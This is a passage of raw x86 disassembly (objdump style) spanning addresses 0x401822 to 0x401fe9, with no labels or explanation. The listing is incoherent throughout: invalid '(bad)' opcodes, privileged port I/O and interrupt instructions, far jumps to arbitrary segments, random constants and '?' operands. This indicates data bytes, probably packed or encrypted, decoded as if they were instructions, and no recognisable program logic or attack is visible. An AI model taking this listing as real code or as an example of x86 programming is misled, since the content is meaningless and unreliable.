  401822:	in     eax,0x1c
  401824:	pop    edx
  401825:	pop    esi
  401826:	xchg   esp,eax
  401827:	mov    esp,0xd1cb2d09
  40182c:	mov    ds:0x130d88de,eax
  401831:	jge    0x4018b0
  401833:	out    0x79,al
  401835:	mov    BYTE PTR [ebx+0x2],ah
  401838:	jo     0x4018af
  40183a:	das    
  40183b:	rcr    DWORD PTR [eax],0x6c
  40183e:	add    DWORD PTR [ebp+0x458858c5],eax
  401844:	xor    DWORD PTR ds:0xfd1be5ee,0x40
  40184b:	add    DWORD PTR [edx-0x5f9061c6],0xfffffffb
  401852:	icebp  
  401853:	pop    edx
  401854:	test   eax,0xe78148fc
  401859:	xor    eax,0x4cc1655c
  40185e:	clc    
  40185f:	inc    esi
  401860:	push   edi
  401861:	cli    
  401862:	jl     0x4017e5
  401864:	or     DWORD PTR [ebp+eax*2-0x64],esi
  401868:	xor    BYTE PTR [eax+0x3226cea],0x75
  40186f:	cmp    al,0xfd
  401871:	pop    ecx
  401872:	fist   DWORD PTR [edi+0x932478a]
  401878:	adc    esi,DWORD PTR [ebx+edx*4]
  40187b:	aam    0xd6
  40187d:	inc    ebx
  40187e:	pusha  
  40187f:	vpacksswb xmm5,xmm2,xmm1
  401883:	pop    ds
  401884:	and    bh,BYTE PTR [esi]
  401886:	add    DWORD PTR [edi+0x79bf4eef],esp
  40188c:	push   0x6c
  40188e:	inc    esp
  40188f:	cld    
  401890:	enter  0xd65d,0xf2
  401894:	clc    
  401895:	js     0x40190e
  401897:	cmp    dh,dh
  401899:	xchg   ebx,eax
  40189a:	(bad)  
  40189b:	cmp    bl,BYTE PTR [ecx+0x47]
  40189e:	fcom   QWORD PTR [ebx]
  4018a0:	in     eax,0xd6
  4018a2:	je     0x40187e
  4018a4:	sti    
  4018a5:	ror    BYTE PTR ds:0x7724e243,1
  4018ab:	cmp    BYTE PTR [eax+0x26],bh
  4018ae:	ret    
  4018af:	push   ecx
  4018b0:	fs adc eax,0xf89cd1bd
  4018b6:	fwait
  4018b7:	pop    ss
  4018b8:	stos   DWORD PTR es:[edi],eax
  4018b9:	jecxz  0x401875
  4018bb:	adc    BYTE PTR [edi],cl
  4018bd:	inc    ebp
  4018be:	lahf   
  4018bf:	jp     0x40191b
  4018c1:	mov    BYTE PTR [eax+0x6c],dh
  4018c4:	fcom   DWORD PTR [eax]
  4018c6:	push   esi
  4018c7:	loopne 0x401854
  4018c9:	pop    ebp
  4018ca:	fmul   st,st(5)
  4018cc:	adc    eax,0xce0fe825
  4018d1:	fbld   TBYTE PTR [ebx+0x58ea3fc1]
  4018d7:	cmp    al,0x1b
  4018d9:	jl     0x4018b5
  4018db:	cld    
  4018dc:	xchg   DWORD PTR [edx-0x31],edx
  4018df:	pushf  
  4018e0:	cld    
  4018e1:	cld    
  4018e2:	or     DWORD PTR ds:0xb918490b,eax
  4018e8:	jl     0x401890
  4018ea:	in     eax,dx
  4018eb:	sbb    BYTE PTR [eax-0x5],ah
  4018ee:	fisubr WORD PTR [edi]
  4018f0:	mov    ebx,0xe29adf3
  4018f5:	test   BYTE PTR [ebx-0x51],0xeb
  4018f9:	add    edx,esp
  4018fb:	push   ebx
  4018fc:	rcl    DWORD PTR [edx-0x6f6e2ac0],cl
  401902:	lock in al,0x62
  401905:	pop    edi
  401906:	dec    esp
  401907:	inc    ebp
  401908:	inc    ebx
  401909:	pop    es
  40190a:	jbe    0x401909
  40190c:	jge    0x401936
  40190e:	mov    edx,0x72e45203
  401913:	jnp    0x401956
  401915:	xchg   ecx,eax
  401916:	adc    dl,BYTE PTR [eax]
  401918:	(bad)  
  401919:	fisttp DWORD PTR [eax+0x3737d60b]
  40191f:	(bad)  
  401920:	pop    ecx
  401921:	arpl   WORD PTR [eax+edx*8],dx
  401924:	shr    BYTE PTR [ecx+edi*4],0x45
  401928:	outs   dx,BYTE PTR ds:[esi]
  401929:	xor    ah,bh
  40192b:	or     BYTE PTR [esi-0x6ceb9b24],cl
  401931:	xchg   ebp,eax
  401932:	mov    ds:0x2cbc1110,al
  401937:	xor    eax,0x40f34bf2
  40193c:	add    esp,DWORD PTR [ebx]
  40193e:	add    ch,ch
  401940:	aas    
  401941:	cmp    eax,DWORD PTR [edi]
  401943:	inc    ecx
  401944:	scas   eax,DWORD PTR es:[edi]
  401945:	mov    eax,DWORD PTR ds:[edi-0x1]
  401949:	xor    edx,DWORD PTR [ebx-0x3b536f59]
  40194f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401950:	leave  
  401951:	jo     0x4018d3
  401953:	je     0x401928
  401955:	dec    ebx
  401956:	xchg   esi,eax
  401957:	in     eax,0x96
  401959:	and    DWORD PTR [edx],ebx
  40195b:	mov    edx,0xbe64e906
  401960:	pop    edx
  401961:	sbb    BYTE PTR es:[edx-0x1d0e9fe],bh
  401968:	(bad)  
  401969:	mov    dl,0x34
  40196b:	imul   esp,DWORD PTR [ebp+0x5f37cecf],0xffffffc7
  401972:	mov    bh,0x3e
  401974:	rol    ch,0x47
  401977:	and    al,BYTE PTR [ebx+0x62]
  40197a:	jb     0x4019ba
  40197c:	xor    esi,DWORD PTR [ebp-0x34]
  40197f:	jl     0x4019cc
  401981:	pop    ss
  401982:	mov    ch,0x2c
  401984:	dec    edi
  401985:	pop    ebp
  401986:	loopne 0x401991
  401988:	sub    al,0x2b
  40198a:	xchg   esi,eax
  40198b:	rcr    esi,0xce
  40198e:	mov    ecx,0xbd7f8183
  401993:	xor    BYTE PTR [ebp-0x51],dl
  401996:	push   eax
  401997:	fsubr  DWORD PTR [ecx+0x5c]
  40199a:	adc    BYTE PTR [edi],bh
  40199c:	clc    
  40199d:	(bad)  
  40199e:	jge    0x37044ea8
  4019a4:	sbb    al,0xda
  4019a6:	test   eax,0xf102d51e
  4019ab:	fstp   st(6)
  4019ad:	daa    
  4019ae:	fstp   QWORD PTR [esi+0x7fa645c1]
  4019b4:	pop    edx
  4019b5:	jmp    0xa3f6:0x492fbcb8
  4019bc:	cmp    edi,esi
  4019be:	(bad)  
  4019c0:	lea    ecx,[eax]
  4019c2:	in     al,0x4
  4019c4:	mov    BYTE PTR [esi-0x2739feb0],ch
  4019ca:	stos   BYTE PTR es:[edi],al
  4019cb:	xchg   esp,eax
  4019cc:	jge    0x40196b
  4019ce:	push   edi
  4019cf:	(bad)  
  4019d0:	fist   WORD PTR ds:0xbc35004e
  4019d6:	iret   
  4019d7:	mov    dh,0x91
  4019d9:	or     BYTE PTR [ebp+0x725bbf9c],dh
  4019df:	and    bl,bl
  4019e1:	shl    BYTE PTR [edi],cl
  4019e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019e4:	ins    DWORD PTR es:[edi],dx
  4019e5:	and    al,0x44
  4019e7:	aaa    
  4019e8:	cld    
  4019e9:	sbb    al,0xc9
  4019eb:	inc    edx
  4019ec:	jmp    0x26c6:0xfa1ed973
  4019f3:	and    eax,0x21886623
  4019f8:	div    BYTE PTR [ecx+0x4ea0495a]
  4019fe:	fnstcw WORD PTR [eax+0x4b37ff8d]
  401a04:	call   0x69b9b5aa
  401a09:	fist   WORD PTR [esi]
  401a0b:	jmp    0x4019e0
  401a0d:	shr    BYTE PTR [ebp-0x2ef18530],0x47
  401a14:	jbe    0x401a2e
  401a16:	adc    al,0xa5
  401a18:	sub    BYTE PTR [edi-0x63],ah
  401a1b:	ds pop esi
  401a1d:	fisub  WORD PTR [esi+edi*8-0x594fae3c]
  401a24:	nop
  401a25:	mov    ah,0xa2
  401a27:	pop    ebp
  401a28:	dec    edx
  401a29:	je     0x401a88
  401a2b:	bound  eax,QWORD PTR [esi-0x76014a2f]
  401a31:	push   eax
  401a32:	dec    eax
  401a33:	add    al,BYTE PTR [ebx+esi*8+0x1d]
  401a37:	xchg   BYTE PTR [bx+si-0x2862],al
  401a3c:	imul   edi,DWORD PTR [eax-0x473a849b],0x1abd1f66
  401a46:	pop    ebp
  401a47:	scas   eax,DWORD PTR es:[edi]
  401a48:	sbb    eax,0x83e099f2
  401a4d:	mov    dh,0xee
  401a4f:	push   esi
  401a50:	mov    edx,0xfcb3a2b9
  401a55:	arpl   bx,bx
  401a57:	pop    esi
  401a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a59:	sbb    BYTE PTR [esi+0x8fb23e8],al
  401a5f:	retf   
  401a60:	mov    dh,0xc1
  401a62:	sbb    ah,0x7
  401a65:	fidiv  WORD PTR [ecx-0x4a]
  401a68:	mov    edx,0x53756340
  401a6d:	add    esi,DWORD PTR [ecx-0x5657fde2]
  401a73:	les    eax,FWORD PTR [edi]
  401a75:	push   ebp
  401a76:	shl    BYTE PTR [edi+edx*4-0x80],cl
  401a7a:	aam    0xe5
  401a7c:	inc    edx
  401a7d:	cmp    al,0x21
  401a7f:	std    
  401a80:	leave  
  401a81:	pop    ebp
  401a82:	ds inc edi
  401a84:	sub    BYTE PTR [eax],bh
  401a86:	xchg   esp,eax
  401a87:	bound  ebx,QWORD PTR [ebp-0x7d]
  401a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a8b:	jno    0x401a9e
  401a8d:	lds    ecx,FWORD PTR [edx+0x3170e6cd]
  401a93:	mov    edi,0x30af1ff
  401a98:	add    BYTE PTR [eax],dh
  401a9a:	mov    bl,cl
  401a9c:	pop    es
  401a9d:	pop    es
  401a9e:	jo     0xaec3afc2
  401aa4:	ja     0x401a7e
  401aa6:	cmp    dl,BYTE PTR [eax]
  401aa8:	fmul   QWORD PTR [ecx-0x1]
  401aab:	mov    dl,0x3e
  401aad:	outs   dx,DWORD PTR ds:[esi]
  401aae:	test   ah,cl
  401ab0:	sbb    ebx,DWORD PTR [esi-0x5ddfa2a]
  401ab6:	call   0xe6d9bb09
  401abb:	xor    DWORD PTR [ebp-0x38b48326],edx
  401ac1:	jmp    0x56f8f04a
  401ac6:	icebp  
  401ac7:	(bad)  
  401ac9:	scas   al,BYTE PTR es:[edi]
  401aca:	dec    ebx
  401acb:	leave  
  401acc:	fisub  DWORD PTR [edx-0x5a28c255]
  401ad2:	dec    esp
  401ad3:	popaw  
  401ad5:	add    eax,0x3f86ed60
  401adb:	test   BYTE PTR [edx],ah
  401add:	imul   eax,DWORD PTR [ecx-0x6d],0x16
  401ae1:	cmp    DWORD PTR [esi+0x33ce0c96],0xffffff8e
  401ae8:	or     al,BYTE PTR [edi]
  401aea:	jmp    0xa4334405
  401aef:	jno    0x401b3b
  401af1:	out    dx,al
  401af2:	adc    DWORD PTR [ecx+esi*8],ebp
  401af5:	popa   
  401af6:	sub    bh,BYTE PTR [edi+0x60f386cb]
  401afc:	fist   WORD PTR [edx-0x61]
  401aff:	and    eax,0xaf697c76
  401b04:	test   DWORD PTR [ebp-0x1e],0x549fb796
  401b0b:	leave  
  401b0c:	adc    eax,0xc99a9e8f
  401b11:	dec    esi
  401b12:	neg    ah
  401b14:	ins    DWORD PTR es:[edi],dx
  401b15:	inc    esi
  401b16:	out    0x4b,al
  401b18:	inc    ebp
  401b19:	retf   0xa5c3
  401b1c:	lods   al,BYTE PTR ds:[esi]
  401b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b1e:	fwait
  401b1f:	push   ds
  401b20:	hlt    
  401b21:	int3   
  401b22:	shr    DWORD PTR ds:0xd14be9e3,1
  401b28:	mov    ds:0x35d0c6d3,al
  401b2d:	loop   0x401b00
  401b2f:	adc    DWORD PTR [esi+edx*1-0x6e],ebp
  401b33:	sub    al,ch
  401b35:	fwait
  401b36:	jle    0x13967971
  401b3c:	enter  0xe37f,0x17
  401b40:	mov    edx,0xbe2a9d4e
  401b45:	mov    eax,ds:0x715acf44
  401b4a:	jmp    0x9f54:0x2bc66096
  401b51:	jle    0x401b4c
  401b53:	sar    ch,1
  401b55:	inc    ebx
  401b56:	std    
  401b57:	fwait
  401b58:	mov    dh,0x7
  401b5a:	call   0x70c04bc9
  401b5f:	fmul   st,st(0)
  401b61:	mov    ch,0x3
  401b63:	mov    ds:0x5c4f373f,eax
  401b68:	and    al,cl
  401b6a:	fstp   DWORD PTR [esi+0x5cc58fa7]
  401b70:	mov    ch,0xb5
  401b72:	inc    edi
  401b73:	pop    eax
  401b74:	sub    al,0x94
  401b76:	xchg   esp,eax
  401b77:	out    0xa0,eax
  401b79:	mov    dh,0xd4
  401b7b:	inc    esp
  401b7c:	jmp    0xe2c7:0x5520647a
  401b83:	rcl    esp,cl
  401b85:	adc    BYTE PTR [edx+0x5344d8b7],bl
  401b8b:	xor    DWORD PTR [eax-0x25],0xffffffdc
  401b8f:	hlt    
  401b90:	add    al,0x45
  401b92:	push   ds
  401b93:	or     eax,0xaaa99034
  401b98:	pop    esp
  401b99:	mov    ah,0x1d
  401b9b:	out    0x35,eax
  401b9d:	cmp    eax,0x2a9a8af7
  401ba2:	fld    QWORD PTR [ebx-0x34]
  401ba5:	(bad)  
  401ba6:	mov    ebx,0xf2cd2d0
  401bab:	mov    dl,0x20
  401bad:	aaa    
  401bae:	mov    ds:0x8c2bf24d,al
  401bb3:	xchg   edi,eax
  401bb4:	out    dx,eax
  401bb5:	data16 mov dh,BYTE PTR [eax]
  401bb8:	into   
  401bb9:	mov    edi,0x27eb9c60
  401bbe:	pop    ebp
  401bbf:	pushf  
  401bc0:	sbb    BYTE PTR [ebx-0x43f133a5],0xe7
  401bc7:	dec    ebp
  401bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc9:	mov    ebp,0x4f90cf77
  401bce:	std    
  401bcf:	sbb    al,0x21
  401bd1:	sub    ebx,DWORD PTR [ebx+edi*4]
  401bd4:	pop    ecx
  401bd5:	mov    bl,0x42
  401bd7:	push   ss
  401bd8:	retf   
  401bd9:	jmp    0xd213:0x6dd7bda8
  401be0:	jmp    0xc56e:0xa6e64891
  401be7:	cmp    ch,BYTE PTR [ebx-0x572616d8]
  401bed:	sahf   
  401bee:	call   0x74f6d848
  401bf3:	jmp    0xe16c787b
  401bf8:	push   es
  401bf9:	jmp    0x401c4b
  401bfb:	(bad)  
  401bfc:	push   ds
  401bfd:	mov    ecx,0x23813b53
  401c02:	xor    eax,0x4f0da7d7
  401c07:	dec    edi
  401c08:	shl    ch,0x8c
  401c0b:	jge    0x401c60
  401c0d:	ins    BYTE PTR es:[edi],dx
  401c0e:	jmp    0x93d8:0xcdaefda2
  401c15:	ror    DWORD PTR [edx],cl
  401c17:	mov    ds:0x4a463e50,eax
  401c1c:	sbb    BYTE PTR [edi+esi*1],cl
  401c1f:	dec    ebx
  401c20:	pushf  
  401c21:	dec    ebp
  401c22:	mov    eax,0x81ea7037
  401c27:	ss mov al,0xab
  401c2a:	fimul  DWORD PTR [ebp+0xd718591]
  401c30:	add    bh,BYTE PTR [ebx]
  401c32:	stc    
  401c33:	bound  ebp,QWORD PTR [eax-0x30]
  401c36:	(bad)  
  401c37:	and    al,0xd1
  401c39:	jg     0x401c2e
  401c3b:	test   DWORD PTR [ebp-0x5ec4ce79],esi
  401c41:	cmp    dl,BYTE PTR [edx+0x178440de]
  401c47:	dec    ebx
  401c48:	cld    
  401c49:	add    dl,BYTE PTR [ecx+edi*1-0x2674c1b7]
  401c50:	scas   al,BYTE PTR es:[edi]
  401c51:	or     ebp,DWORD PTR [edi+0x9]
  401c54:	fnsave [ebp+0x75891fdf]
  401c5a:	cs dec ecx
  401c5c:	xor    DWORD PTR [edi-0x6a],edi
  401c5f:	add    BYTE PTR [eax+0x24d3d960],dl
  401c65:	pop    edx
  401c66:	dec    ebp
  401c67:	jp     0x401c31
  401c69:	stos   BYTE PTR es:[edi],al
  401c6a:	sti    
  401c6b:	popf   
  401c6c:	mov    ch,0x4e
  401c6e:	leave  
  401c6f:	mov    ch,0x19
  401c71:	call   0x7543e034
  401c76:	sub    DWORD PTR [ebp-0x15cd4fe6],edi
  401c7c:	fdivr  QWORD PTR [edx+0x7e8ebb5a]
  401c82:	aad    0xb
  401c84:	rcl    DWORD PTR [edi-0x52],cl
  401c87:	imul   esi,DWORD PTR [edx],0x5ad8cd49
  401c8d:	cmc    
  401c8e:	lahf   
  401c8f:	lods   eax,DWORD PTR ds:[esi]
  401c90:	cmp    ebp,edx
  401c92:	mov    al,ds:0x855dda4e
  401c97:	fld    DWORD PTR [edx-0x75]
  401c9a:	aas    
  401c9b:	sbb    dh,bh
  401c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c9e:	mov    esi,0xcf3d94a6
  401ca3:	sub    ch,BYTE PTR [ecx]
  401ca5:	loope  0x401c2b
  401ca7:	aam    0xa1
  401ca9:	push   edi
  401caa:	and    ah,ah
  401cac:	retf   
  401cad:	es sti 
  401caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cb0:	sub    eax,0x999abb02
  401cb5:	mov    eax,0xb5c4be1a
  401cba:	call   0xde65:0x6b757f2b
  401cc1:	lods   eax,DWORD PTR ds:[esi]
  401cc2:	jno    0x401caf
  401cc4:	and    ecx,ecx
  401cc6:	push   0x5030cdc
  401ccb:	lock stos DWORD PTR es:[edi],eax
  401ccd:	loopne 0x401c55
  401ccf:	xor    eax,edx
  401cd1:	imul   ebp
  401cd3:	sbb    eax,0x3f120e03
  401cd8:	jae    0x401c7f
  401cda:	push   ebp
  401cdb:	jg     0x401d13
  401cdd:	call   0x9555:0x50e9ecf
  401ce4:	pop    ss
  401ce5:	cwde   
  401ce6:	dec    esp
  401ce7:	outs   dx,BYTE PTR ds:[esi]
  401ce8:	shr    DWORD PTR [eax],cl
  401cea:	test   DWORD PTR [ebp-0x22],ebp
  401ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cee:	xchg   DWORD PTR [ebx],edx
  401cf0:	cmp    esi,ebx
  401cf2:	fwait
  401cf3:	das    
  401cf4:	xchg   BYTE PTR [edi-0x56],ch
  401cf7:	cli    
  401cf8:	xor    bl,bh
  401cfa:	sub    eax,0xca78249a
  401cff:	ja     0x401cc7
  401d01:	push   0x75
  401d03:	cmp    ah,cl
  401d05:	out    0xd1,al
  401d07:	out    dx,al
  401d08:	adc    eax,0x88f11f62
  401d0d:	test   al,0x5a
  401d0f:	add    DWORD PTR [ebx+0x4466cf2],ebp
  401d15:	neg    dl
  401d17:	int    0x9d
  401d19:	cmp    ah,dh
  401d1b:	imul   ecx,DWORD PTR [ebp+0x77],0x534de14
  401d22:	mov    al,ds:0x18f702a6
  401d27:	jae    0x401da5
  401d29:	mov    bl,0x67
  401d2b:	sbb    ah,BYTE PTR ds:0xc771b5c
  401d31:	add    eax,DWORD PTR [esi-0x349106e4]
  401d37:	xlat   BYTE PTR ds:[ebx]
  401d38:	mov    ds:0xdb435787,al
  401d3d:	clc    
  401d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d3f:	leave  
  401d40:	out    0x25,al
  401d42:	out    0xb4,al
  401d44:	add    BYTE PTR [ecx-0x4d20da83],dh
  401d4a:	xchg   dl,bh
  401d4c:	add    bh,BYTE PTR [edx-0x324cfd30]
  401d52:	dec    ebx
  401d53:	les    edx,FWORD PTR [edx]
  401d55:	out    dx,al
  401d56:	adc    ecx,edi
  401d58:	loopne 0x401d58
  401d5a:	push   eax
  401d5b:	inc    edx
  401d5c:	sub    BYTE PTR [ecx-0x29],0x76
  401d60:	sub    BYTE PTR [ecx+esi*4],dl
  401d63:	jbe    0x401d70
  401d65:	or     edx,DWORD PTR [esi+edx*1+0x42923891]
  401d6c:	push   ebp
  401d6d:	mov    BYTE PTR [eax-0x5c],ah
  401d70:	xlat   BYTE PTR ds:[ebx]
  401d71:	xor    esp,esp
  401d73:	pop    ds
  401d74:	mov    esi,DWORD PTR [eax]
  401d76:	int    0xd1
  401d78:	dec    eax
  401d79:	call   0x82c6:0xd5c1b093
  401d80:	sub    dh,BYTE PTR [ecx-0x67b915d0]
  401d86:	inc    ecx
  401d87:	int    0x93
  401d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d8a:	xor    DWORD PTR [edi],ecx
  401d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d8d:	pop    ss
  401d8e:	popf   
  401d8f:	mov    DWORD PTR [eax+0x36],eax
  401d92:	mov    DWORD PTR [ebx+0xb],eax
  401d95:	es mov ah,0x1d
  401d98:	or     DWORD PTR [ecx],edx
  401d9a:	xchg   BYTE PTR [edx+0x392b1fd],dl
  401da0:	mov    bh,0x36
  401da2:	jmp    0x401dbc
  401da4:	popf   
  401da5:	in     eax,0xc7
  401da7:	nop
  401da8:	out    dx,eax
  401da9:	pop    edx
  401daa:	out    0xd4,al
  401dac:	pop    eax
  401dad:	(bad)  
  401dae:	mov    eax,0x90d13b7c
  401db3:	stos   DWORD PTR es:[edi],eax
  401db4:	loopne 0x401e2e
  401db6:	out    dx,eax
  401db7:	inc    esp
  401db8:	mov    WORD PTR [eax],fs
  401dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dbb:	out    dx,al
  401dbc:	aaa    
  401dbd:	mov    al,ds:0x784662fe
  401dc2:	and    DWORD PTR [eax],esi
  401dc4:	xor    BYTE PTR [esp+edx*4+0x1c],dh
  401dc8:	pop    edi
  401dc9:	scas   eax,DWORD PTR es:[edi]
  401dca:	and    ebp,DWORD PTR [edx]
  401dcc:	dec    esp
  401dcd:	push   ebp
  401dce:	jmp    FWORD PTR [esi]
  401dd0:	pop    edi
  401dd1:	int3   
  401dd2:	cs push 0x4c6ee065
  401dd8:	stc    
  401dd9:	xchg   ebp,eax
  401dda:	pushf  
  401ddb:	scas   al,BYTE PTR es:[edi]
  401ddc:	aaa    
  401ddd:	inc    ebp
  401dde:	scas   al,BYTE PTR es:[edi]
  401ddf:	jg     0x401d87
  401de1:	sub    DWORD PTR [edx-0x7a],0x8cb1ec81
  401de8:	add    ecx,edx
  401dea:	lds    ecx,FWORD PTR [esi-0x340459c1]
  401df0:	cmp    dl,BYTE PTR [esi]
  401df2:	retf   0xac4d
  401df5:	int3   
  401df6:	dec    eax
  401df7:	mov    ?,WORD PTR [eax+ecx*4+0x52e182f]
  401dfe:	jle    0x401dec
  401e00:	fs out 0x1b,al
  401e03:	adc    ebp,DWORD PTR [edi+0x4362e62b]
  401e09:	mov    eax,0xaef96c3c
  401e0e:	push   edx
  401e0f:	and    al,0x8f
  401e11:	adc    edx,DWORD PTR [edx+0x4a]
  401e14:	out    0x88,al
  401e16:	push   0x11
  401e18:	frstor [edx+0x5f]
  401e1b:	retf   
  401e1c:	jecxz  0x401e6b
  401e1e:	out    0xa4,eax
  401e20:	fs iret 
  401e22:	enter  0xf0c1,0xf4
  401e26:	(bad)  
  401e27:	daa    
  401e28:	jae    0x401deb
  401e2a:	stos   DWORD PTR es:[edi],eax
  401e2b:	jae    0x401dbb
  401e2d:	ret    
  401e2e:	je     0x401e4b
  401e30:	cdq    
  401e31:	popf   
  401e32:	pop    eax
  401e33:	arpl   bp,bx
  401e35:	cld    
  401e36:	ficomp DWORD PTR [eax]
  401e38:	loopne 0x401e8d
  401e3a:	mov    edx,0x5dee3c4c
  401e3f:	ss push ebp
  401e41:	sub    ecx,edx
  401e43:	adc    al,0x23
  401e45:	xor    cl,BYTE PTR [ebp+0x18]
  401e48:	jle    0x401e6a
  401e4a:	out    0xfb,eax
  401e4c:	fsub   DWORD PTR [ebp-0x7d]
  401e4f:	repz jbe 0x401e7f
  401e52:	adc    eax,0x11b7308f
  401e57:	mov    WORD PTR [ebx-0x10d28765],?
  401e5d:	and    al,BYTE PTR [edi]
  401e5f:	ja     0x401eae
  401e61:	shl    BYTE PTR [ebx],cl
  401e63:	into   
  401e64:	int    0x5
  401e66:	in     eax,0x1b
  401e68:	cdq    
  401e69:	shl    DWORD PTR [eax+edx*2+0x3e],1
  401e6d:	sbb    esi,0x44
  401e70:	sub    eax,DWORD PTR [ecx-0x5]
  401e73:	je     0x401e33
  401e75:	aad    0x9e
  401e77:	div    DWORD PTR [eax-0x64]
  401e7a:	sbb    BYTE PTR [ecx+0x58],0xd1
  401e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e7f:	test   DWORD PTR [esi+edi*8],0x23cd3e44
  401e86:	jmp    0x401e55
  401e88:	test   ebx,ebp
  401e8a:	xchg   ebp,eax
  401e8b:	push   esi
  401e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e8d:	and    BYTE PTR [edx+0x2d],dl
  401e90:	(bad)
  401e93:	xor    DWORD PTR [edx-0x38b1fce6],0x65e54782
  401e9d:	push   ebx
  401e9e:	mov    DWORD PTR [edx],esp
  401ea0:	jb     0x401f1c
  401ea2:	lods   eax,DWORD PTR ds:[esi]
  401ea3:	enter  0x1a35,0xf0
  401ea7:	outs   dx,DWORD PTR ds:[esi]
  401ea8:	cli    
  401ea9:	jle    0x401ee7
  401eab:	mov    WORD PTR [esi+eax*1+0x24108fd0],?
  401eb2:	pop    ecx
  401eb3:	gs xchg ebx,eax
  401eb5:	push   0x25a22401
  401eba:	ds pop ebp
  401ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ebd:	push   esp
  401ebe:	rcl    DWORD PTR [eax+0x56],cl
  401ec1:	dec    esp
  401ec2:	push   esi
  401ec3:	inc    ebx
  401ec4:	cmp    al,0x93
  401ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ec7:	pop    eax
  401ec8:	jnp    0x401e91
  401eca:	int3   
  401ecb:	inc    ebp
  401ecc:	rol    DWORD PTR [ebx-0x7b],0xc9
  401ed0:	pop    ecx
  401ed1:	add    BYTE PTR [eax],0x43
  401ed4:	pushf  
  401ed5:	push   ds
  401ed6:	pop    ecx
  401ed7:	xchg   ebp,eax
  401ed8:	jmp    0x5827c78a
  401edd:	stos   BYTE PTR es:[edi],al
  401ede:	push   ecx
  401edf:	call   0xd0b7:0xe61c3398
  401ee6:	mov    edi,0x16e06083
  401eeb:	das    
  401eec:	or     ebx,DWORD PTR [edx-0x1a76d54e]
  401ef2:	loope  0x401f3b
  401ef4:	shl    BYTE PTR ds:0xdfd791f3,0x5c
  401efb:	addr16 pop ecx
  401efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401efe:	rcr    DWORD PTR [ebp-0x2eb30b15],cl
  401f04:	push   ds
  401f05:	xor    al,0x2c
  401f07:	mov    bp,0xc00d
  401f0b:	cs sbb bh,dh
  401f0e:	jl     0x401e92
  401f10:	popf   
  401f11:	jnp    0x401f40
  401f13:	fwait
  401f14:	xor    dl,BYTE PTR [ebx]
  401f16:	lea    ebx,[edx-0x1bd2d0c0]
  401f1c:	xlat   BYTE PTR ds:[ebx]
  401f1d:	push   ss
  401f1e:	imul   DWORD PTR [edx+0x248d353d]
  401f24:	dec    ecx
  401f25:	sahf   
  401f26:	ins    BYTE PTR es:[edi],dx
  401f27:	les    ebx,FWORD PTR [ebx+0x4]
  401f2a:	mov    ebx,0x6f264814
  401f2f:	repz jmp 0x401f0a
  401f32:	jle    0x401f27
  401f34:	scas   al,BYTE PTR es:[edi]
  401f35:	xchg   edx,eax
  401f36:	or     al,0xae
  401f38:	push   esp
  401f39:	mov    dl,0xa3
  401f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f3c:	cmp    BYTE PTR [ecx],ch
  401f3e:	mulps  xmm2,XMMWORD PTR [esi+0x2]
  401f42:	push   esp
  401f43:	retf   
  401f44:	inc    ecx
  401f45:	inc    ebx
  401f46:	jne    0x401f57
  401f48:	fstp   QWORD PTR [edx]
  401f4a:	jae    0x401f4f
  401f4c:	cmc    
  401f4d:	add    dh,BYTE PTR [ebx+0x55]
  401f50:	xchg   ebp,eax
  401f51:	mov    esi,0xadbafef6
  401f56:	and    ebx,edx
  401f58:	jbe    0x401f90
  401f5a:	push   eax
  401f5b:	jno    0x401ee4
  401f5d:	xchg   BYTE PTR [edx],bl
  401f5f:	add    bl,BYTE PTR [ebx+ebx*4]
  401f62:	adc    eax,0x811b0df1
  401f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f68:	psllq  mm5,QWORD PTR [ecx+0x52e577cb]
  401f6f:	push   edi
  401f70:	pop    eax
  401f71:	mov    dl,BYTE PTR [ebp-0x619947ab]
  401f77:	stc    
  401f78:	mov    edi,0x743423c7
  401f7d:	pushf  
  401f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f7f:	xchg   ebx,eax
  401f80:	fisubr WORD PTR [edx-0x3e16b87a]
  401f86:	push   ss
  401f87:	push   esp
  401f88:	popa   
  401f89:	std    
  401f8a:	and    DWORD PTR [edx-0x1472940],0xffffffa3
  401f91:	xor    DWORD PTR [esi+0x65dccb98],0x51a021c
  401f9b:	fs sub eax,0x14af8d5b
  401fa1:	fsub   QWORD PTR [edx+ebx*4-0x16ad6161]
  401fa8:	ins    BYTE PTR es:[edi],dx
  401fa9:	test   BYTE PTR [ebx+0x64db2648],ah
  401faf:	jmp    0x401fd7
  401fb1:	mov    dl,0xe8
  401fb3:	stc    
  401fb4:	ja     0x402011
  401fb6:	pop    edi
  401fb7:	les    ebx,FWORD PTR [esi+0x3d]
  401fba:	sub    eax,0x5ab87949
  401fbf:	test   ecx,ecx
  401fc1:	mov    edx,0x8ab753e5
  401fc6:	add    al,BYTE PTR [ecx+0x63]
  401fc9:	and    DWORD PTR [edx-0x88edf0b],ebp
  401fcf:	add    al,0xe2
  401fd1:	mov    WORD PTR [ebp-0x4e9cb15f],es
  401fd7:	test   DWORD PTR [ebp+0x6dab3941],esp
  401fdd:	setb   BYTE PTR ds:0x7e3f8f39
  401fe4:	retf   0x5ab7
  401fe7:	mov    bh,0x8c
  401fe9:	push   0xd191fbf1
